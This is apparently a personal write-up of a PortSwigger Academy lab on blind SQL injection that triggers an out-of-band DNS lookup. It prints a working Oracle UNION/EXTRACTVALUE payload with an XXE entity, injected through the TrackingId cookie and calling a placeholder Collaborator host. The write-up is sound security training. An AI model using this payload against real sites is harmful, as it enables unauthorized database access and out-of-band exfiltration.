his lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain.

To solve the lab, exploit the SQL injection vulnerability to cause a DNS lookup to Burp Collaborator.

#### Note

To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.

I started by visiting the shop's front page and intercepting the request containing the `TrackingId` cookie using **Burp Suite**.

I then modified the cookie to inject a SQL query combined with an **XXE payload** designed to trigger an interaction with the Burp Collaborator server:

```text
TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
```

I used **Insert Collaborator payload** in Burp Suite to replace the placeholder with a unique Burp Collaborator subdomain.

After sending the request, the payload triggered a **DNS lookup** to the Collaborator server, confirming the out-of-band interaction and successfully completing the lab.